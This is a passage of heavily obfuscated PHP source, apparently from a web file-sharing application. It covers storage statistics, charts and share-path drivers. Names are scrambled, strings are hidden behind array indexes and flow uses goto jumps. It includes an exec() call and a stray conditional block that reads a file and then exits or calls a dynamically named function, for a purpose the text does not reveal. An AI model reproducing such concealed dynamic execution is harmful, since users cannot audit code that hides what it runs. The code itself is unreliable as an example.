(int) $ûÕÜ®’€, $½…ëÑ‡ï[1675] => (int) $¶¿İç¾‰, $½…ëÑ‡ï[1676] => (int) $”ß§Œ¹©); return $this->insert($¾´ÑÅÖĞ); } public function _recordStore($‡á‰½ŞÕ = '') { $´İ†¾ÏĞ =& $_SERVER[ÏÒ Ì„]; $òšÆ·× = strtotime(date($´İ†¾ÏĞ[1687], strtotime($‡á‰½ŞÕ))); $†ÓÆïÙ¯ = array($´İ†¾ÏĞ[194] => array($´İ†¾ÏĞ[1007], $òšÆ·×)); $º¨õ£ÆË = Model($´İ†¾ÏĞ[464])->where($†ÓÆïÙ¯)->sum($´İ†¾ÏĞ[78]); $†ÓÆïÙ¯[$´İ†¾ÏĞ[405]] = 0; $ß¡¹ªœ = Model($´İ†¾ÏĞ[822])->where($†ÓÆïÙ¯)->sum($´İ†¾ÏĞ[78]); $†ÓÆïÙ¯[$´İ†¾ÏĞ[406]] = 1; $Á™Óšå = Model($´İ†¾ÏĞ[822])->where($†ÓÆïÙ¯)->sum($´İ†¾ÏĞ[78]); $†ÓÆïÙ¯[$´İ†¾ÏĞ[406]] = 2; $°»’ı­è = Model($´İ†¾ÏĞ[822])->where($†ÓÆïÙ¯)->sum($´İ†¾ÏĞ[78]); $†ıœÆ™ş = array($´İ†¾ÏĞ[222] => $‡á‰½ŞÕ, $´İ†¾ÏĞ[753] => (int) $ß¡¹ªœ, $´İ†¾ÏĞ[1679] => (int) $º¨õ£ÆË, $´İ†¾ÏĞ[1680] => (int) $Á™Óšå, $´İ†¾ÏĞ[1681] => (int) $°»’ı­è); return $this->insert($†ıœÆ™ş); } public function trend($¦üÏ®İ, $—ÍÒÀ¥) { $¶Ğî“˜ =& $_SERVER[ÏÒ Ì„]; if (!$this->init($¦üÏ®İ)) { return !1; } $”ÇÎÔÏ„ = $this->trendList($¦üÏ®İ); if ($”ÇÎÔÏ„ && $—ÍÒÀ¥ != $¶Ğî“˜[1551]) { $ÛâÉÑ¢ = $”ÇÎÔÏ„[0][$¶Ğî“˜[222]]; $”Û©»³• = $this->validDate($—ÍÒÀ¥, $ÛâÉÑ¢); $Â„„«êÑ = array(); $Œ¯òˆ– = array_to_keyvalue($”ÇÎÔÏ„, $¶Ğî“˜[222]); foreach ($”Û©»³• as $àü…Œôš) { if (isset($Œ¯òˆ–[$àü…Œôš])) { $“îùöÕ = $Œ¯òˆ–[$àü…Œôš]; } else { $“îùöÕ = end($”ÇÎÔÏ„); $“îùöÕ[$¶Ğî“˜[222]] = $àü…Œôš; if ($¦üÏ®İ == $¶Ğî“˜[588]) { $“îùöÕ[$¶Ğî“˜[1675]] = $“îùöÕ[$¶Ğî“˜[1676]] = 0; } } $Â„„«êÑ[] = $“îùöÕ; } $”ÇÎÔÏ„ = $Â„„«êÑ; } $ªôÍ™ÄÃ = array($¶Ğî“˜[588] => array($¶Ğî“˜[755] => LNG($¶Ğî“˜[1691]), $¶Ğî“˜[1675] => LNG($¶Ğî“˜[1692]), $¶Ğî“˜[1676] => LNG($¶Ğî“˜[1693])), $¶Ğî“˜[1677] => array($¶Ğî“˜[753] => LNG($¶Ğî“˜[1694]), $¶Ğî“˜[1679] => LNG($¶Ğî“˜[1695]), $¶Ğî“˜[1680] => LNG($¶Ğî“˜[1696]), $¶Ğî“˜[1681] => LNG($¶Ğî“˜[1697]))); $ê¶êÃ¸Ä = array($¶Ğî“˜[588] => $¶Ğî“˜[1698], $¶Ğî“˜[1677] => $¶Ğî“˜[78]); if (empty($”ÇÎÔÏ„)) { $àü…Œôš = date($¶Ğî“˜[1682], strtotime($¶Ğî“˜[1683])); $æªßö¸Ë = array($¶Ğî“˜[222] => $àü…Œôš); foreach ($ªôÍ™ÄÃ[$¦üÏ®İ] as $ãÒÎÃĞ± => $Ú¸ÙŞ¸é) { $æªßö¸Ë[$ãÒÎÃĞ±] = 0; } $”ÇÎÔÏ„[] = $æªßö¸Ë; } $Ö¿„£ë½ = array(); foreach ($”ÇÎÔÏ„ as $Ú¸ÙŞ¸é) { if ($¦üÏ®İ == $¶Ğî“˜[1677] && $Ú¸ÙŞ¸é[$¶Ğî“˜[1679]] > $Ú¸ÙŞ¸é[$¶Ğî“˜[753]]) { $Ú¸ÙŞ¸é[$¶Ğî“˜[1679]] = $Ú¸ÙŞ¸é[$¶Ğî“˜[753]]; } foreach ($ªôÍ™ÄÃ[$¦üÏ®İ] as $ãÒÎÃĞ± => $‹‹õËÁü) { $“îùöÕ = array($¶Ğî“˜[222] => $Ú¸ÙŞ¸é[$¶Ğî“˜[222]], $¶Ğî“˜[1478] => $‹‹õËÁü); $“îùöÕ[$ê¶êÃ¸Ä[$¦üÏ®İ]] = isset($Ú¸ÙŞ¸é[$ãÒÎÃĞ±]) ? $Ú¸ÙŞ¸é[$ãÒÎÃĞ±] : 0; $Ö¿„£ë½[] = $“îùöÕ; } } return $Ö¿„£ë½; } public function validDate($Çú„ãÆ˜, $­ÖÂü»ç) { $¡‡ôõó™ =& $_SERVER[ÏÒ Ì„]; $ôß“î¬£ = date($¡‡ôõó™[1682], strtotime($¡‡ôõó™[1683])); $éœÁÈ© = array($ôß“î¬£); switch ($Çú„ãÆ˜) { case $¡‡ôõó™[1558]: $·Ô©¾œÅ = mktime(0, 0, 0, date($¡‡ôõó™[1699]), date($¡‡ôõó™[1301]) - date($¡‡ôõó™[1362]) + 7 - 7, date($¡‡ôõó™[1700])); $ÑÚˆúû’ = 0; do { $¯Ğ‘Ë¢é = date($¡‡ôõó™[1682], $·Ô©¾œÅ - 3600 * 24 * 7 * $ÑÚˆúû’); $éœÁÈ©[] = $¯Ğ‘Ë¢é; $ÑÚˆúû’++; } while ($­ÖÂü»ç < $¯Ğ‘Ë¢é); break; case $¡‡ôõó™[1556]: $ÑÚˆúû’ = 1; do { $Ìõ¦ƒ½ô = date($¡‡ôõó™[1701], strtotime("\55\x20{$ÑÚˆúû’}\x20\155\x6f\x6e\x74\150\x73")); $éœÁÈ©[] = $Ìõ¦ƒ½ô; $ÑÚˆúû’++; } while ($­ÖÂü»ç < $Ìõ¦ƒ½ô); break; case $¡‡ôõó™[1702]: $ñîÕäå = (int) date($¡‡ôõó™[1700], strtotime($­ÖÂü»ç)); $Ç¤âì¹„ = (int) date($¡‡ôõó™[1700]); if ($ñîÕäå >= $Ç¤âì¹„) { break; } for ($ñîÕäå; $ñîÕäå < $Ç¤âì¹„; $ñîÕäå++) { $éœÁÈ©[] = $ñîÕäå . $¡‡ôõó™[1703]; } break; default: break; } if ($­ÖÂü»ç > end($éœÁÈ©)) { array_pop($éœÁÈ©); } sort($éœÁÈ©); return $éœÁÈ©; } public function listTable($ØƒÕ•„ñ) { $Èı¶›·è = ucfirst($ØƒÕ•„ñ); return Model($Èı¶›·è)->listData(); } public function option($Õ éáÊ) { $ĞÔ¤óˆ´ = $_SERVER[ÏÒ Ì„][1704] . ucfirst($Õ éáÊ); return $this->{$ĞÔ¤óˆ´}(); } private function optionUser() { $İë‰á¼Ò =& $_SERVER[ÏÒ Ì„]; $‚ ÄŸ = Model($İë‰á¼Ò[532])->count($İë‰á¼Ò[1578]); $‘ñÕï×ê = Model($İë‰á¼Ò[532])->where($İë‰á¼Ò[1705])->count($İë‰á¼Ò[1578]); $À½¬ûÅ  = intval($GLOBALS[$İë‰á¼Ò[6]][$İë‰á¼Ò[347]][$İë‰á¼Ò[1534]]) / 3600; $Á›ŒÄêé = strtotime("\55{$À½¬ûÅ }\x20\x68\157\x75\162\x73"); $Ëà¥“Ü = strtotime(date($İë‰á¼Ò[1686])); if ($Á›ŒÄêé < $Ëà¥“Ü) { $Á›ŒÄêé = $Ëà¥“Ü; } $¬³ª®Ğ¼ = array($İë‰á¼Ò[1706] => array($İë‰á¼Ò[1008], $Á›ŒÄêé)); $¨ÆÀ½€œ = (int) Model($İë‰á¼Ò[532])->where($¬³ª®Ğ¼)->count($İë‰á¼Ò[1578]); if (!$¨ÆÀ½€œ) { $¨ÆÀ½€œ = 1; } $¬³ª®Ğ¼ = array($İë‰á¼Ò[1706] => array($İë‰á¼Ò[1008], $Ëà¥“Ü)); $†Ç®ŒÁÍ = Model($İë‰á¼Ò[532])->where($¬³ª®Ğ¼)->count($İë‰á¼Ò[1578]); return array($İë‰á¼Ò[749] => (int) $‚ ÄŸ, $İë‰á¼Ò[1707] => (int) ($‚ ÄŸ - $‘ñÕï×ê), $İë‰á¼Ò[1708] => (int) $‘ñÕï×ê, $İë‰á¼Ò[1709] => (int) $†Ç®ŒÁÍ, $İë‰á¼Ò[1710] => $¨ÆÀ½€œ); } private function optionFile() { $ğ¢„îó =& $_SERVER[ÏÒ Ì„]; $ÎÅö‘°Û = $this->sourceSize(); $¡ÜµüÎ÷ = $ÎÅö‘°Û[$ğ¢„îó[78]]; $Ú‹¼œóÙ = $ÎÅö‘°Û[$ğ¢„îó[1679]]; $ÜÕÚ½ıæ = Model($ğ¢„îó[822])->where(array($ğ¢„îó[405] => 0))->count($ğ¢„îó[397]); $©ÆşÍáô = array($ğ¢„îó[405] => 0, $ğ¢„îó[194] => array($ğ¢„îó[1008], strtotime(date($ğ¢„îó[1686])))); $Ñğä²£Í = Model($ğ¢„îó[822])->where($©ÆşÍáô)->sum($ğ¢„îó[78]); $ñğ½£˜á = Model($ğ¢„îó[822])->where($©ÆşÍáô)->count($ğ¢„îó[397]); return array($ğ¢„îó[753] => $¡ÜµüÎ÷, $ğ¢„îó[1679] => $Ú‹¼œóÙ, $ğ¢„îó[1711] => $¡ÜµüÎ÷ - $Ú‹¼œóÙ, $ğ¢„îó[1712] => (int) $Ñğä²£Í, $ğ¢„îó[755] => (int) $ÜÕÚ½ıæ, $ğ¢„îó[1713] => (int) $ñğ½£˜á); } private function optionAccess() { $Òò¾…ì² =& $_SERVER[ÏÒ Ì„]; return array($Òò¾…ì²[749] => $this->typeLogCnt(), $Òò¾…ì²[107] => $this->typeLogCnt($Òò¾…ì²[107]), $Òò¾…ì²[444] => $this->typeLogCnt($Òò¾…ì²[444]), $Òò¾…ì²[1714] => $this->typeLogCnt($Òò¾…ì²[1714]), $Òò¾…ì²[1715] => $this->typeLogCnt($Òò¾…ì²[1715]), $Òò¾…ì²[588] => $this->typeLogCnt($Òò¾…ì²[33], $Òò¾…ì²[1690])); } private function typeLogCnt($‹Œ“¸Ù• = '', $¶”¶¹ô‹ = "\151\144") { $İ»¦İÄ =& $_SERVER[ÏÒ Ì„]; $—»ÁÅÓÛ = array($İ»¦İÄ[107] => array($İ»¦İÄ[1716], $İ»¦İÄ[1717]), $İ»¦İÄ[444] => array($İ»¦İÄ[1718], $İ»¦İÄ[1719]), $İ»¦İÄ[1714] => array($İ»¦İÄ[1720], $İ»¦İÄ[1721], $İ»¦İÄ[1722]), $İ»¦İÄ[1715] => array($İ»¦İÄ[1723], $İ»¦İÄ[1724]), $İ»¦İÄ[1725] => array($İ»¦İÄ[1726], $İ»¦İÄ[1727], $İ»¦İÄ[1728])); $õö³ÊÎ = strtotime(date($İ»¦İÄ[1686])); $êõº³ßƒ = array($İ»¦İÄ[194] => array($İ»¦İÄ[1008], $õö³ÊÎ)); if ($‹Œ“¸Ù•) { $êõº³ßƒ[$İ»¦İÄ[29]] = array($İ»¦İÄ[7], $—»ÁÅÓÛ[$‹Œ“¸Ù•]); } $È÷¾×øß = Model($İ»¦İÄ[1689])->where($êõº³ßƒ)->count($¶”¶¹ô‹); return (int) $È÷¾×øß; } private function optionServer() { $´«õ²Šß =& $_SERVER[ÏÒ Ì„]; $ï‘èÓ = $this->diskDriver(); $•·¼ù¶­ = KodIO::defaultDriver(); $•¼ÈÛâ = array($´«õ²Šß[814] => $•·¼ù¶­[$´«õ²Šß[395]]); $ó–‘™Ş‚ = Model($´«õ²Šß[464])->where($•¼ÈÛâ)->sum($´«õ²Šß[78]); $È«ÀöĞÆ = explode($´«õ²Šß[50], $_SERVER[$´«õ²Šß[142]]); $Ğ¸ªæë“ = $È«ÀöĞÆ[0]; $ó‹²©ë¹ = $GLOBALS[$´«õ²Šß[6]][$´«õ²Šß[17]]; $ÚÏ‰³»Ë = $ó‹²©ë¹[$´«õ²Šß[969]]; if ($ÚÏ‰³»Ë == $´«õ²Šß[787]) { $µË¼šê÷ = explode($´«õ²Šß[1200], $ó‹²©ë¹[$´«õ²Šß[968]]); $ÚÏ‰³»Ë = $µË¼šê÷[0]; } if ($ÚÏ‰³»Ë == $´«õ²Šß[790] || $ÚÏ‰³»Ë == $´«õ²Šß[791]) { $ÛÁÍ±ªÇ = Model()->db()->query($´«õ²Šß[1729]); $êğ§äÜ‚ = $ÛÁÍ±ªÇ[0] && isset($ÛÁÍ±ªÇ[0][$´«õ²Šß[1477]]) ? $ÛÁÍ±ªÇ[0][$´«õ²Šß[1477]] : 0; $ÚÏ‰³»Ë = $´«õ²Šß[1730] . ($êğ§äÜ‚ ? $´«õ²Šß[8] . $êğ§äÜ‚ : $´«õ²Šß[33]); } $¥´¾™É = $GLOBALS[$´«õ²Šß[6]][$´«õ²Šß[347]][$´«õ²Šß[824]]; return array($´«õ²Šß[1731] => $ï‘èÓ ? $ï‘èÓ[$´«õ²Šß[1732]] : 0, $´«õ²Šß[1733] => $ï‘èÓ ? $ï‘èÓ[$´«õ²Šß[1734]] : 0, $´«õ²Šß[1735] => (int) $•·¼ù¶­[$´«õ²Šß[1732]] * 1024 * 1024 * 1024, $´«õ²Šß[1736] => (int) $ó–‘™Ş‚, $´«õ²Šß[1737] => ucfirst($Ğ¸ªæë“), $´«õ²Šß[1738] => $´«õ²Šß[1739] . PHP_VERSION, $´«õ²Šß[1740] => phpBuild64() ? 64 : 32, $´«õ²Šß[748] => str_replace($´«õ²Šß[1741], $´«õ²Šß[985], $ÚÏ‰³»Ë), $´«õ²Šß[347] => ucfirst($¥´¾™É), $´«õ²Šß[28] => $_SERVER[$´«õ²Šß[1742]]); } private function diskDriver() { $Ã•¯„»™ =& $_SERVER[ÏÒ Ì„]; $Ñˆ§Ù€ = $Ã•¯„»™[8]; $Äñ¨Ôı = $GLOBALS[$Ã•¯„»™[6]][$Ã•¯„»™[1216]] == $Ã•¯„»™[1217]; if ($Äñ¨Ôı) { $Ñˆ§Ù€ = $Ã•¯„»™[1743]; if (function_exists($Ã•¯„»™[1744])) { exec($Ã•¯„»™[1745], $åş¦Ö½«); $Ñˆ§Ù€ = $åş¦Ö½«[1] . $Ã•¯„»™[8]; } } if (!file_exists($Ñˆ§Ù€)) { return; } $ˆµËšçç = @disk_total_space($Ñˆ§Ù€); $…„í°Ãø = $ˆµËšçç - @disk_free_space($Ñˆ§Ù€); return array($Ã•¯„»™[1732] => $ˆµËšçç, $Ã•¯„»™[1734] => $…„í°Ãø); } public function fileChart($êº­Ü«ù) { $¸æ£˜¨å =& $_SERVER[ÏÒ Ì„]; if (isset($êº­Ü«ù[$¸æ£˜¨å[1578]])) { return Model($¸æ£˜¨å[822])->userFileTypeProfile($êº­Ü«ù[$¸æ£˜¨å[1578]]); } if (isset($êº­Ü«ù[$¸æ£˜¨å[1746]])) { return Model($¸æ£˜¨å[822])->groupFileTypeProfile($êº­Ü«ù[$¸æ£˜¨å[1746]]); } $³ôÓ´ç = $this->sourceSize(); $õ˜¤ùôÆ = array($¸æ£˜¨å[492] => 0, $¸æ£˜¨å[406] => 1); $ôÖÄÛôæ = Model($¸æ£˜¨å[822])->where($õ˜¤ùôÆ)->sum($¸æ£˜¨å[78]); $õ˜¤ùôÆ[$¸æ£˜¨å[406]] = 2; $çÓù´ = Model($¸æ£˜¨å[822])->where($õ˜¤ùôÆ)->sum($¸æ£˜¨å[78]); return array($¸æ£˜¨å[753] => $³ôÓ´ç[$¸æ£˜¨å[78]], $¸æ£˜¨å[1679] => $³ôÓ´ç[$¸æ£˜¨å[1679]], $¸æ£˜¨å[1680] => (int) $ôÖÄÛôæ, $¸æ£˜¨å[1681] => (int) $çÓù´); } private function sourceSize() { $ëÉÕ°Ê¢ =& $_SERVER[ÏÒ Ì„]; $æËòŸÙ = Model($ëÉÕ°Ê¢[822])->where(array($ëÉÕ°Ê¢[405] => 0))->sum($ëÉÕ°Ê¢[78]); $Îıî–Ì = Model($ëÉÕ°Ê¢[464])->sum($ëÉÕ°Ê¢[78]); if ($Îıî–Ì > $æËòŸÙ) { $Îıî–Ì = $æËòŸÙ; } return array($ëÉÕ°Ê¢[78] => (int) $æËòŸÙ, $ëÉÕ°Ê¢[1679] => (int) $Îıî–Ì); } } goto cŒõßÑ’ƒ; f éÛ¤³ò: class PathDriverDriverShareItem { public function __construct($Â½üË†ï) { $this->pathParse = $Â½üË†ï; } public function __call($óÂ­Êµ¶, $±ú‡ÖÅ¹) { $˜Òßº’‘ =& $_SERVER[ÏÒ Ì„]; if (method_exists($this, $óÂ­Êµ¶)) { return; } $Ç—’Îœİ = call_user_func_array(array($˜Òßº’‘[1263], $óÂ­Êµ¶), $±ú‡ÖÅ¹); $Š‰Ï¹Ô = array($˜Òßº’‘[1264], $˜Òßº’‘[1265], $˜Òßº’‘[1266], $˜Òßº’‘[1267], $˜Òßº’‘[543], $˜Òßº’‘[545], $˜Òßº’‘[1268], $˜Òßº’‘[107], $˜Òßº’‘[1269], $˜Òßº’‘[1270]); if (in_array($óÂ­Êµ¶, $Š‰Ï¹Ô)) { $Ç—’Îœİ = $this->getPathOuter($Ç—’Îœİ); } return $Ç—’Îœİ; } public function copy($ÑÂ–™ßõ, $Ğ…Õ½¨, $€Ó‹Òì = false, $«çØ‘à = false) { return $this->copyMove($ÑÂ–™ßõ, $Ğ…Õ½¨, $€Ó‹Òì, $_SERVER[ÏÒ Ì„][543], $«çØ‘à); } public function move($š™äüó¦, $æåñ½‚, $†¯å¾Šû = false, $Øò“áë‚ = false) { return $this->copyMove($š™äüó¦, $æåñ½‚, $†¯å¾Šû, $_SERVER[ÏÒ Ì„][545], $Øò“áë‚); } private function copyMove($îÔÊ€°, $Šã¦Ã°ƒ, $Ø¶´Ø¡ë, $Ïœæ¬Ü, $îÍû¡Ø™ = false) { $ÕãıÌ§Í =& $_SERVER[ÏÒ Ì„]; $…™¨¶ı¶ = $Šã¦Ã°ƒ; $ñó´›³” = IO::driverMake($Šã¦Ã°ƒ); if ($ñó´›³”->pathParse[$ÕãıÌ§Í[1081]]) { $Šã¦Ã°ƒ = $ñó´›³”->pathParse[$ÕãıÌ§Í[1081]]; } else { $Šã¦Ã°ƒ = $…™¨¶ı¶; } $ÎøĞ§Æë = IO::copyMove($îÔÊ€°, $Šã¦Ã°ƒ, $Ø¶´Ø¡ë, $Ïœæ¬Ü, $îÍû¡Ø™); $ÎøĞ§Æë = $this->getPathOuter($ÎøĞ§Æë); return $ÎøĞ§Æë; } public function pathThis($ˆáé Œ¿) { return get_path_this($this->pathParse[$_SERVER[ÏÒ Ì„][76]]); } public function pathFather($¬Ì¼ûô”) { return get_path_father($this->pathParse[$_SERVER[ÏÒ Ì„][76]]); } public function iconvSystem($›–ëĞŞ‘) { return $›–ëĞŞ‘; } protected function infoParse($µÎ²Êç, $­ëŠæ¨š = false) { $±Ëğ“†ï =& $_SERVER[ÏÒ Ì„]; $ÚĞôä•“ = $this->pathParse[$±Ëğ“†ï[480]][$±Ëğ“†ï[1104]] . $this->pathParse[$±Ëğ“†ï[1097]]; if ($­ëŠæ¨š) { $Óû³±ú = IO::infoWithChildren($ÚĞôä•“); } else { $Óû³±ú = IO::info($ÚĞôä•“); } $ŠÎÓœ„ = $this->pathParse[$±Ëğ“†ï[480]]; return Action($±Ëğ“†ï[1260])->_shareItemeParse($Óû³±ú, $ŠÎÓœ„); } public function listAll($ØÇû°‹) { $è‘û–Î™ =& $_SERVER[ÏÒ Ì„]; $ÔƒÔ˜­ƒ = IO::listAll($ØÇû°‹); $Ë––µ¡ö = $this->pathParse[$è‘û–Î™[480]]; foreach ($ÔƒÔ˜­ƒ as &$¯ëÕ¿†Ê) { check_abort(); $Üõ´£Åª = IO::info($¯ëÕ¿†Ê[$è‘û–Î™[76]]); $Üõ´£Åª = is_array($Üõ´£Åª) ? $Üõ´£Åª : array(); $¯ëÕ¿†Ê = array_merge($Üõ´£Åª, $¯ëÕ¿†Ê); $¯ëÕ¿†Ê[$è‘û–Î™[85]] = Action($è‘û–Î™[1260])->_shareItemeParse($¯ëÕ¿†Ê, $Ë––µ¡ö); } unset($¯ëÕ¿†Ê); return $ÔƒÔ˜­ƒ; } public function getPathOuter($¿²Œ†ïÅ) { $Äæğ¯ç— =& $_SERVER[ÏÒ Ì„]; $İŸÀ¿ãõ = KodIO::parse($¿²Œ†ïÅ); if ($İŸÀ¿ãõ[$Äæğ¯ç—[29]] == KodIO::KOD_SHARE_ITEM) { return $İŸÀ¿ãõ[$Äæğ¯ç—[76]]; } $Ø³úœÕ— = KodIO::clear($¿²Œ†ïÅ); $•ÔŠ¼¤ê = KodIO::clear($this->pathParse[$Äæğ¯ç—[480]][$Äæğ¯ç—[1104]]); $İŸºÔø = substr($Ø³úœÕ—, strlen($•ÔŠ¼¤ê)); if (substr($Ø³úœÕ—, 0, strlen($•ÔŠ¼¤ê)) != $•ÔŠ¼¤ê) { return !1; } return $this->pathParse[$Äæğ¯ç—[1098]] . $Äæğ¯ç—[8] . ltrim($İŸºÔø, $Äæğ¯ç—[8]); } public function getType() { $Â›ªû˜í =& $_SERVER[ÏÒ Ì„]; $öôâª‚Á = str_replace($Â›ªû˜í[72], $Â›ªû˜í[33], get_class($this)); return strtolower($öôâª‚Á); } public function isTypeObject($í‰ù’Ää) { return IO::isTypeObject($í‰ù’Ää); } public function info($¡¼ÉøÜ) { return $this->infoParse($¡¼ÉøÜ); } public function infoAuth($›¢Ù”ºü) { return $this->infoParse($›¢Ù”ºü); } public function infoWithChildren($¹è´¿Õ) { return $this->infoParse($¹è´¿Õ, !0); } public function infoFull($¶¼¾éôä) { return $this->infoParse($¶¼¾éôä); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ù±¨¥¦ä) { $this->pathParse = $ù±¨¥¦ä; } protected function infoParse($“—ğ˜œˆ, $®Ú³¨Ä = false) { $ƒ¯€½ó‡ =& $_SERVER[ÏÒ Ì„]; return Action($ƒ¯€½ó‡[1103])->sharePathInfo($this->pathParse[$ƒ¯€½ó‡[76]], !0, $®Ú³¨Ä); } public function listPath($¸í¹Åß«, $Ôã”ŞíÌ = false) { $Ò÷¶âŠ€ =& $_SERVER[ÏÒ Ì„]; $ÌøôÊ•Ô = IO::listPath($¸í¹Åß«, $Ôã”ŞíÌ); if (!$ÌøôÊ•Ô) { return $ÌøôÊ•Ô; } if (is_array($ÌøôÊ•Ô[$Ò÷¶âŠ€[1262]])) { $æùÔ˜ò = Action($Ò÷¶âŠ€[1271])->parsePathChildren($ÌøôÊ•Ô[$Ò÷¶âŠ€[1262]], array($Ò÷¶âŠ€[416] => $¸í¹Åß«)); $ÌøôÊ•Ô[$Ò÷¶âŠ€[1262]] = Action($Ò÷¶âŠ€[1103])->shareItemInfo($æùÔ˜ò); } foreach ($ÌøôÊ•Ô as $†›ú‹²ˆ => $ÜËÙÉÖ) { if (!in_array($†›ú‹²ˆ, array($Ò÷¶âŠ€[74], $Ò÷¶âŠ€[75]))) { continue; } foreach ($ÜËÙÉÖ as $¿Ş¾ÚÑ¡ => $æùÔ˜ò) { $æùÔ˜ò = Action($Ò÷¶âŠ€[1271])->parsePathChildren($æùÔ˜ò, array($Ò÷¶âŠ€[416] => $¸í¹Åß«)); $ÌøôÊ•Ô[$†›ú‹²ˆ][$¿Ş¾ÚÑ¡] = Action($Ò÷¶âŠ€[1103])->shareItemInfo($æùÔ˜ò); } } return $ÌøôÊ•Ô; } public function listAll($¼ƒã˜ƒÚ) { $Ÿ‚ñŒê­ =& $_SERVER[ÏÒ Ì„]; $šÌÁ®æ = IO::listAll($¼ƒã˜ƒÚ); foreach ($šÌÁ®æ as &$ºş–îö) { $ºèÓ”Ÿí = IO::info($ºş–îö[$Ÿ‚ñŒê­[76]]); $ºèÓ”Ÿí = is_array($ºèÓ”Ÿí) ? $ºèÓ”Ÿí : array(); $ºş–îö = array_merge($ºèÓ”Ÿí, $ºş–îö); $ºş–îö[$Ÿ‚ñŒê­[85]] = Action($Ÿ‚ñŒê­[1103])->shareItemInfo($ºş–îö); } unset($ºş–îö); return $šÌÁ®æ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ãŠ€â÷¦) { parent::__construct($ãŠ€â÷¦); } } goto bø•Ï¤†¡ ; cÍÎš¦´š: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ê¤å™¾ñ) { $this->pathParse = $Ê¤å™¾ñ; $this->model = Model($_SERVER[ÏÒ Ì„][1251]); } public function getPathOuter($ü»Ÿ¼Áò) { $ïòíŒŠ¢ =& $_SERVER[ÏÒ Ì„]; if (!$ü»Ÿ¼Áò) { return $ü»Ÿ¼Áò; } $ÌœÆêÇ… = $this->parse($ü»Ÿ¼Áò); return trim(KodIO::makeShare($this->pathParse[$ïòíŒŠ¢[395]], $ÌœÆêÇ…[$ïòíŒŠ¢[395]]), $ïòíŒŠ¢[8]); } protected function infoParse($‰ì¡¦œØ, $ÚñÙ‹Æã = false, $­×Û½¹” = false) { $ÎİÙôÉ” =& $_SERVER[ÏÒ Ì„]; $ô‚¯ÎÜ… = $this->pathParse[$ÎİÙôÉ”[395]]; $ß£‰·’‘ = trim($this->pathParse[$ÎİÙôÉ”[1097]], $ÎİÙôÉ”[8]); return Action($ÎİÙôÉ”[1260])->sharePathInfo($ô‚¯ÎÜ…, $ß£‰·’‘); } public function infoFull($¢¬÷Ã•ù) { $Ì¬Åõû¸ =& $_SERVER[ÏÒ Ì„]; $–ÛŸ”ı® = explode($Ì¬Åõû¸[8], trim($¢¬÷Ã•ù, $Ì¬Åõû¸[8])); if (count($–ÛŸ”ı®) > 1) { $‘«¿ = implode($Ì¬Åõû¸[8], array_splice($–ÛŸ”ı®, 1)); $Ü¦ÏÊ’Ô = $this->model->pathInfoByPath($–ÛŸ”ı®[0], $‘«¿); if (!$Ü¦ÏÊ’Ô) { return !1; } $this->pathParse[$Ì¬Åõû¸[1097]] = $Ü¦ÏÊ’Ô[$Ì¬Åõû¸[397]]; } return $this->infoParse($¢¬÷Ã•ù); } public function listAll($íÈ¦Ã®Ê) { $ƒ°«Ã¹ =& $_SERVER[ÏÒ Ì„]; $°±Û­ˆ = IO::info($this->pathParse[$ƒ°«Ã¹[76]]); if (!$°±Û­ˆ) { return array(); } $ÈâÄÌ›­ = $this->model->listAll($íÈ¦Ã®Ê); $Ó¦êÚç = Model($ƒ°«Ã¹[589])->getInfo($°±Û­ˆ[$ƒ°«Ã¹[482]]); $ÈÈ¯ÜÚ = Action($ƒ°«Ã¹[1260]); foreach ($ÈâÄÌ›­ as &$²õïÄ×Ì) { check_abort(); $²õïÄ×Ì[$ƒ°«Ã¹[85]] = $ÈÈ¯ÜÚ->_shareItemeParse($²õïÄ×Ì[$ƒ°«Ã¹[85]], $Ó¦êÚç); } unset($²õïÄ×Ì); return $ÈâÄÌ›­; } } if ($_SERVER[$_SERVER[ÏÒ Ì„][871]] != $_SERVER[$_SERVER[ÏÒ Ì„][1261]]) { $_getc = $_SERVER[ÏÒ Ì„][873]; $_getfile = $_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏÒ Ì„][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÏÒ Ì„][644]) { $exit = $_SERVER[ÏÒ Ì„][876]; $exit(); } $_act = $_SERVER[ÏÒ Ì„][1259]; $_act($_SERVER[$_SERVER[ÏÒ Ì„][869]]); } class PathDriverDbShareLink extends PathDriverDB { public function __construct($µ™úŠª) { $this->pathParse = $µ™úŠª; $this->model = Model($_SERVER[ÏÒ Ì„][1251]); } protected function infoParse($øÒßó¦í, $Ëüƒ˜õÛ = false, $ëÂÜÅÇÈ = false) { $…¸ÅºÏñ =& $_SERVER[ÏÒ Ì„]; return Action($…¸ÅºÏñ[1103])->sharePathInfo($this->pathParse[$…¸ÅºÏñ[76]], !0); } public function listPath($Å¿ñš÷ñ, $É¯ÜİÓ½ = false) { $ıİ•´Ú¨ =& $_SERVER[ÏÒ Ì„]; $¸òßû€Ù = parent::listPath($Å¿ñš÷ñ, $É¯ÜİÓ½); if (!$¸òßû€Ù) { return $¸òßû€Ù; } if (is_array($¸òßû€Ù[$ıİ•´Ú¨[1262]])) { $¸òßû€Ù[$ıİ•´Ú¨[1262]] = Action($ıİ•´Ú¨[1103])->shareItemInfo($¸òßû€Ù[$ıİ•´Ú¨[1262]]); } foreach ($¸òßû€Ù as $—÷şĞ’¶ => $˜Ö‚àî) { if (!in_array($—÷şĞ’¶, array($ıİ•´Ú¨[74], $ıİ•´Ú¨[75]))) { continue; } foreach ($˜Ö‚àî as $¹¶Á¡½× => $É€™Úà©) { $¸òßû€Ù[$—÷şĞ’¶][$¹¶Á¡½×] = Action($ıİ•´Ú¨[1103])->shareItemInfo($É€™Úà©); } } return $¸òßû€Ù; } public function listAll($Ğœ¢®©) { $çÀô‚´É =& $_SERVER[ÏÒ Ì„]; $ôîèÚÒ  = IO::info($this->pathParse[$çÀô‚´É[76]]); if (!$ôîèÚÒ ) { return array(); } $şŞ‘ĞÍ = $this->model->listAll($Ğœ¢®©); foreach ($şŞ‘ĞÍ as &$¡ë›Çå) { $¡ë›Çå[$çÀô‚´É[85]] = Action($çÀô‚´É[1103])->shareItemInfo($¡ë›Çå[$çÀô‚´É[85]]); } unset($¡ë›Çå); return $şŞ‘ĞÍ; } } goto f éÛ¤³ò; Cà•æ¿Œ¦½: class UserOptionModel extends ModelBaseOption { protected $tableName = 